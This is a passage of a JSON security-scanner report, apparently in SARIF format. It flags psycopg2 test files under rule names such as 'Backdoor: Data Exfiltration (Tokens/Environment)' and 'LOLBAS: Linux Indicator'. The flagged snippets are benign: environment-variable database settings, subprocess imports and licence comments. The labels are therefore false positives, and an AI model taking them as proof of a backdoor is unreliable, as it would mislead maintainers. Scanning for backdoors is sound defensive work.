                    "text": "dbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\n",
                    "rendered": {
                      "text": "dbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\n",
                      "markdown": "`dbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 41,
                  "endLine": 9,
                  "endColumn": 49,
                  "snippet": {
                    "text": "dbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\n",
                    "rendered": {
                      "text": "dbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\n",
                      "markdown": "`dbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 15,
                  "endLine": 42,
                  "endColumn": 26,
                  "snippet": {
                    "text": "if repl_dsn == '':\n    repl_dsn = dsn\n\nrepl_slot = os.environ.get('PSYCOPG2_TEST_REPL_SLOT', 'psycopg2_test_slot')\n",
                    "rendered": {
                      "text": "if repl_dsn == '':\n    repl_dsn = dsn\n\nrepl_slot = os.environ.get('PSYCOPG2_TEST_REPL_SLOT', 'psycopg2_test_slot')\n",
                      "markdown": "`if repl_dsn == '':\n    repl_dsn = dsn\n\nrepl_slot = os.environ.get('PSYCOPG2_TEST_REPL_SLOT', 'psycopg2_test_slot')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 38,
                  "startColumn": 14,
                  "endLine": 38,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n# Don't run replication tests if REPL_DSN is not set, default to normal DSN if\n# set to empty string.\nrepl_dsn = os.environ.get('PSYCOPG2_TEST_REPL_DSN', None)\nif repl_dsn == '':\n    repl_dsn = dsn\n\n",
                    "rendered": {
                      "text": "\n# Don't run replication tests if REPL_DSN is not set, default to normal DSN if\n# set to empty string.\nrepl_dsn = os.environ.get('PSYCOPG2_TEST_REPL_DSN', None)\nif repl_dsn == '':\n    repl_dsn = dsn\n\n",
                      "markdown": "`\n# Don't run replication tests if REPL_DSN is not set, default to normal DSN if\n# set to empty string.\nrepl_dsn = os.environ.get('PSYCOPG2_TEST_REPL_DSN', None)\nif repl_dsn == '':\n    repl_dsn = dsn\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 11,
                  "endLine": 12,
                  "endColumn": 22,
                  "snippet": {
                    "text": "dbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\nif green:\n    if green == '1':\n        from psycopg2.extras import wait_select as wait_callback\n",
                    "rendered": {
                      "text": "dbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\nif green:\n    if green == '1':\n        from psycopg2.extras import wait_select as wait_callback\n",
                      "markdown": "`dbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\nif green:\n    if green == '1':\n        from psycopg2.extras import wait_select as wait_callback\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 12,
                  "endLine": 9,
                  "endColumn": 66,
                  "snippet": {
                    "text": "dbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\n",
                    "rendered": {
                      "text": "dbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\n",
                      "markdown": "`dbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\ngreen = os.environ.get('PSYCOPG2_TEST_GREEN', None)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 12,
                  "endLine": 8,
                  "endColumn": 62,
                  "snippet": {
                    "text": "dbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\n",
                    "rendered": {
                      "text": "dbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\n",
                      "markdown": "`dbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n# Check if we want to test psycopg's green path.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 12,
                  "endLine": 7,
                  "endColumn": 62,
                  "snippet": {
                    "text": "\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n",
                    "rendered": {
                      "text": "\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n",
                      "markdown": "`\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 12,
                  "endLine": 6,
                  "endColumn": 62,
                  "snippet": {
                    "text": "import os\n\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n",
                    "rendered": {
                      "text": "import os\n\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n",
                      "markdown": "`import os\n\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\ndbpass = os.environ.get('PSYCOPG2_TESTDB_PASSWORD', os.environ.get('PGPASSWORD'))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testconfig.py"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 12,
                  "endLine": 5,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\nimport os\n\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\n",
                    "rendered": {
                      "text": "\nimport os\n\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\n",
                      "markdown": "`\nimport os\n\ndbname = os.environ.get('PSYCOPG2_TESTDB', 'psycopg2_test')\ndbhost = os.environ.get('PSYCOPG2_TESTDB_HOST', os.environ.get('PGHOST'))\ndbport = os.environ.get('PSYCOPG2_TESTDB_PORT', os.environ.get('PGPORT'))\ndbuser = os.environ.get('PSYCOPG2_TESTDB_USER', os.environ.get('PGUSER'))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_notify.py"
                },
                "region": {
                  "startLine": 62,
                  "startColumn": 6,
                  "endLine": 63,
                  "snippet": {
                    "text": "            payload = f\", {payload!r}\"\n\n        script = (\"\"\"\\\nimport time\ntime.sleep({sec})\nimport {module} as psycopg2\nimport {module}.extensions as ext\nconn = psycopg2.connect({dsn!r})\n",
                    "rendered": {
                      "text": "            payload = f\", {payload!r}\"\n\n        script = (\"\"\"\\\nimport time\ntime.sleep({sec})\nimport {module} as psycopg2\nimport {module}.extensions as ext\nconn = psycopg2.connect({dsn!r})\n",
                      "markdown": "`            payload = f\", {payload!r}\"\n\n        script = (\"\"\"\\\nimport time\ntime.sleep({sec})\nimport {module} as psycopg2\nimport {module}.extensions as ext\nconn = psycopg2.connect({dsn!r})\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_notify.py"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 7,
                  "endLine": 61,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        else:\n            payload = f\", {payload!r}\"\n\n        script = (\"\"\"\\\nimport time\ntime.sleep({sec})\nimport {module} as psycopg2\n",
                    "rendered": {
                      "text": "        else:\n            payload = f\", {payload!r}\"\n\n        script = (\"\"\"\\\nimport time\ntime.sleep({sec})\nimport {module} as psycopg2\n",
                      "markdown": "`        else:\n            payload = f\", {payload!r}\"\n\n        script = (\"\"\"\\\nimport time\ntime.sleep({sec})\nimport {module} as psycopg2\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_notify.py"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 6,
                  "endLine": 37,
                  "snippet": {
                    "text": "from .testconfig import dsn\n\nimport sys\nimport time\nimport select\nfrom subprocess import Popen, PIPE\n\n\n",
                    "rendered": {
                      "text": "from .testconfig import dsn\n\nimport sys\nimport time\nimport select\nfrom subprocess import Popen, PIPE\n\n\n",
                      "markdown": "`from .testconfig import dsn\n\nimport sys\nimport time\nimport select\nfrom subprocess import Popen, PIPE\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_notify.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_notify.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_cancel.py"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 6,
                  "endLine": 27,
                  "snippet": {
                    "text": "# FITNESS FOR A PARTICULAR PURPOSE.  See the GNU Lesser General Public\n# License for more details.\n\nimport time\nimport threading\n\nimport psycopg2\nimport psycopg2.extensions\n",
                    "rendered": {
                      "text": "# FITNESS FOR A PARTICULAR PURPOSE.  See the GNU Lesser General Public\n# License for more details.\n\nimport time\nimport threading\n\nimport psycopg2\nimport psycopg2.extensions\n",
                      "markdown": "`# FITNESS FOR A PARTICULAR PURPOSE.  See the GNU Lesser General Public\n# License for more details.\n\nimport time\nimport threading\n\nimport psycopg2\nimport psycopg2.extensions\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_cancel.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_cancel.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/__init__.py"
                },
                "region": {
                  "startLine": 69,
                  "startColumn": 25,
                  "endLine": 69,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        cnn = psycopg2.connect(dsn)\n    except Exception as e:\n        print(\"Failed connection to test db:\", e.__class__.__name__, e)\n        print(\"Please set env vars 'PSYCOPG2_TESTDB*' to valid values.\")\n        sys.exit(1)\n    else:\n        cnn.close()\n",
                    "rendered": {
                      "text": "        cnn = psycopg2.connect(dsn)\n    except Exception as e:\n        print(\"Failed connection to test db:\", e.__class__.__name__, e)\n        print(\"Please set env vars 'PSYCOPG2_TESTDB*' to valid values.\")\n        sys.exit(1)\n    else:\n        cnn.close()\n",
                      "markdown": "`        cnn = psycopg2.connect(dsn)\n    except Exception as e:\n        print(\"Failed connection to test db:\", e.__class__.__name__, e)\n        print(\"Please set env vars 'PSYCOPG2_TESTDB*' to valid values.\")\n        sys.exit(1)\n    else:\n        cnn.close()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/__init__.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
